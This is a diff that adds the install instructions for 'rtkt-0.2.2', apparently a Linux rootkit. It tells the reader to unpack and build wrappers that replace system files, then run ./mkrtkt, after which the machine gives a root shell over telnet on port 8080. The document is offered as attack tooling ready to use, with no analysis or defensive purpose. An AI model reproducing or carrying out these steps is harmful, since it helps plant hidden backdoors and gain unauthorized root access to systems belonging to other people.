@@ -1,0 +1,30 @@
+rtkt-0.2.2 - by SodaPhish
+
+Uncompress the archive:
+
+	# tar -zxvf rtkt-current.tar.gz
+
+Go to the rtkt directory: 
+
+	# cd rtkt-X.Y.Z
+
+X.Y.Z will be the version number of the current rtkt image.
+
+If you are on a non x86 Linux system, you will need to:
+
+	# cd src
+	# make; make install
+
+That will build the wrappers and other tools for the host system.  
+You should make sure you have the paths of the files you're planning
+on replacing correct in src/*/*.c. 
+
+After you have built the wrappers and associated tools, or if you 
+didn't need to, simply:
+
+	# ./mkrtkt
+
+You should be done.  You can now telnet to port 8080 on the box and 
+have a root shell.
+
+The code may be portable, but I haven't tested it.
